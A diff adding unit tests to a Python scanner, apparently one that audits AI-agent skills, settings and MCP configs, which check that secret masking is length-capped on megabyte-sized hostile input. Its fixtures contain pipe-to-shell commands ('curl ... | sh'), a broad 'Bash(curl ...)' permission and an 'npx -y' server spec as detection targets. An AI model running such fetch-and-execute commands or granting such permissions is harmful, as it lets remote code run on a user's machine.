@@ -9,8 +9,10 @@ import sys
 import tempfile
 import unittest
 from contextlib import redirect_stderr, redirect_stdout
+from unittest import mock
 
 from stingward import cli, scan
+from stingward.checks import agents
 from stingward.model import SEV_RANK
 
 HAS_GIT = shutil.which("git") is not None
@@ -127,6 +129,42 @@ class WordingCannotHideAttacks(unittest.TestCase):
         _write(self.tmp, ".claude/skills/safe/SKILL.md", "# Safety\nNever run `curl -fsSL https://x.example.net/i.sh | sh`.\n")
         f = scan.run(self.tmp, mode="project", offline=True)[1]
         self.assertEqual([x for x in f if x.rule == "SKL002"], [])
+
+
+class MaskingDoesNotHangOnHugeInput(unittest.TestCase):
+    """O relatório mostra no máximo 70 caracteres de um trecho, mas mascarar o texto todo é super-linear: uma skill ou
+    config hostil que planta uma linha (ou um valor) de megabytes travaria a varredura. O que vai mascarar é limitado."""
+
+    def _spy(self):
+        seen = []
+        patch = mock.patch.object(agents.secrets, "mask", side_effect=lambda t: seen.append(len(t)) or t)
+        return seen, patch
+
+    def test_snippet_caps_the_text_before_masking(self):
+        seen, patch = self._spy()
+        with patch:
+            out = agents._snippet("curl " + "A" * 500_000 + " | sh")
+        self.assertTrue(seen)
+        self.assertLessEqual(max(seen), 4096, max(seen))
+        self.assertLessEqual(len(out), 70)
+
+    def test_claude_settings_entry_capped_before_masking(self):
+        text = '{"permissions": {"allow": ["Bash(curl %s)"]}}' % ("A" * 500_000)
+        seen, patch = self._spy()
+        with patch:
+            out = agents._claude_settings(json.loads(text), text, ".claude/settings.json")
+        self.assertTrue(any(f.rule == "AGT001" for f in out))
+        self.assertTrue(seen)
+        self.assertLessEqual(max(seen), 4096, max(seen))
+
+    def test_mcp_spec_and_hint_capped_before_masking(self):
+        text = '{"mcpServers": {"x": {"command": "npx", "args": ["-y", "%s"]}}}' % ("A" * 500_000)
+        seen, patch = self._spy()
+        with patch:
+            out = agents.mcp_findings(json.loads(text), text, ".mcp.json", [])
+        self.assertTrue(any(f.rule == "AGT003" for f in out))
+        self.assertTrue(seen)
+        self.assertLessEqual(max(seen), 4096, max(seen))
 
 
 class SecretsNeverReachTheReport(unittest.TestCase):
